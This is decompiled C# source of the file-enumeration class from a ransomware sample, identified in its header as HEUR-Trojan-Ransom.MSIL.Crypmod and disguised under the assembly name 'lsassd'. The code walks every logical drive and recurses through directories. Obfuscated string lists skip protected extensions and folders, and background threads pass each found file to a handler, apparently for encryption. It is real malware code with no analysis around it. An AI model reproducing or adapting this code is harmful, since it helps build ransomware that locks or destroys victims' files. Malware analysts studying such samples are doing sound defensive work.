// Decompiled with JetBrains decompiler
// Type: MOISHE.Core.FileSystem
// Assembly: lsassd, Version=3.4.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 432C6617-1CB7-4116-A49C-FF7B0B5EE7E5
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.MSIL.Crypmod.gen-b3ebc327773f5f846deeb1255475644a630c4d0d3b4eda3bbf995a36599c07cf.exe

using \u003CPrivateImplementationDetails\u003E\u007B18A11B1C\u002D3AA7\u002D4357\u002DAAD9\u002DCC83BB5216E3\u007D;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace MOISHE.Core
{
  public class FileSystem
  {
    private static string[] A = new string[7]
    {
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.J(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.i(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.k(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.j(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.K(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.H(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.h()
    };
    private static string[] a = new string[2]
    {
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.ak(),
      \u0030EC61CFD\u002D4C73\u002D453F\u002DA634\u002D6FCB684E549C.aL()
    };
    private static BlockingCollection<Thread> A = new BlockingCollection<Thread>((IProducerConsumerCollection<Thread>) new ConcurrentQueue<Thread>(), 10);

    public static bool IsGuarded(FileInfo file)
    {
      string name = file.Name;
      for (int index = 0; index < FileSystem.A.Length; ++index)
      {
        if (name.EndsWith(FileSystem.A[index]))
          return true;
      }
      return false;
    }

    public static bool IsGuarded(DirectoryInfo file)
    {
      string name = file.Name;
      for (int index = 0; index < FileSystem.A.Length; ++index)
      {
        if (name.EndsWith(FileSystem.A[index]))
          return true;
      }
      for (int index = 0; index < FileSystem.a.Length; ++index)
      {
        if (name == FileSystem.a[index])
          return true;
      }
      return false;
    }

    public static List<DirectoryInfo> EnumerateSubDirectories(DirectoryInfo root)
    {
      List<DirectoryInfo> directoryInfoList = new List<DirectoryInfo>();
      try
      {
        foreach (DirectoryInfo enumerateDirectory in root.EnumerateDirectories())
        {
          if (!FileSystem.IsGuarded(enumerateDirectory))
            directoryInfoList.Add(enumerateDirectory);
        }
      }
      catch
      {
      }
      return directoryInfoList;
    }

    public static List<FileInfo> EnumerateFiles(DirectoryInfo root)
    {
      List<FileInfo> fileInfoList = new List<FileInfo>();
      try
      {
        foreach (FileInfo enumerateFile in root.EnumerateFiles())
        {
          if (!FileSystem.IsGuarded(enumerateFile))
            fileInfoList.Add(enumerateFile);
        }
      }
      catch
      {
      }
      return fileInfoList;
    }

    public static List<DirectoryInfo> EnumerateRoots()
    {
      string[] logicalDrives = System.IO.Directory.GetLogicalDrives();
      List<DirectoryInfo> directoryInfoList = new List<DirectoryInfo>();
      foreach (string path in logicalDrives)
        directoryInfoList.Add(new DirectoryInfo(path));
      return directoryInfoList;
    }

    public static DirectoryInfo Directory(string path) => new DirectoryInfo(path);

    public static FileInfo File(string path) => new FileInfo(path);

    public static bool IsDirectory(string path)
    {
      try
      {
        return new DirectoryInfo(path).Exists;
      }
      catch
      {
      }
      return false;
    }

    private static bool A([In] string obj0, [In] List<string> obj1)
    {
      foreach (string str in obj1)
      {
        if (obj0.ToLower().Equals(str.ToLower()) || obj0.ToLower().EndsWith(str.ToLower()) || obj0.ToLower().StartsWith(str.ToLower()) || obj0.ToLower().Contains(str.ToLower()))
          return true;
      }
      return false;
    }

    public static void RecursePathSync(
      string path,
      BlockingCollection<string> sink,
      RecursorItemSubmittedHandler handler)
    {
      if (FileSystem.IsDirectory(path))
      {
        DirectoryInfo directoryInfo = FileSystem.Directory(path);
        foreach (FileSystemInfo enumerateFile in directoryInfo.EnumerateFiles())
        {
          string fullName = enumerateFile.FullName;
          sink.Add(fullName);
          if (handler != null)
            handler(fullName);
        }
        foreach (DirectoryInfo enumerateDirectory in directoryInfo.EnumerateDirectories())
        {
          try
          {
            FileSystem.RecursePathSync(enumerateDirectory.FullName, sink, handler);
          }
          catch
          {
          }
        }
      }
      else
      {
        string fullName = FileSystem.File(path).FullName;
        sink.Add(fullName);
        if (handler == null)
          return;
        handler(fullName);
      }
    }

    public static void RecursePath(
      string path,
      List<string> protection,
      BlockingCollection<string> sink,
      RecursorItemSubmittedHandler handler)
    {
      // ISSUE: object of a compiler-generated type is created
      // ISSUE: variable of a compiler-generated type
      FileSystem.A a = new FileSystem.A();
      // ISSUE: reference to a compiler-generated field
      a.A = protection;
      // ISSUE: reference to a compiler-generated field
      a.A = sink;
      // ISSUE: reference to a compiler-generated field
      a.A = handler;
      if (!FileSystem.IsDirectory(path))
        return;
      try
      {
        // ISSUE: reference to a compiler-generated field
        a.A = FileSystem.EnumerateFiles(FileSystem.Directory(path));
        // ISSUE: reference to a compiler-generated field
        if (a.A != null)
        {
          // ISSUE: reference to a compiler-generated field
          if (a.A.Count > 0)
          {
            // ISSUE: reference to a compiler-generated field
            if (a.A != null)
            {
              // ISSUE: reference to a compiler-generated method
              Thread thread = new Thread(new ThreadStart(a.A));
              thread.IsBackground = true;
              thread.Priority = ThreadPriority.BelowNormal;
              FileSystem.A.Add(thread);
              thread.Start();
            }
          }
        }
      }
      catch
      {
      }
      foreach (DirectoryInfo enumerateSubDirectory in FileSystem.EnumerateSubDirectories(FileSystem.Directory(path)))
      {
        try
        {
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          // ISSUE: reference to a compiler-generated field
          FileSystem.RecursePath(enumerateSubDirectory.FullName, a.A, a.A, a.A);
        }
        catch
        {
        }
      }
    }
  }
}
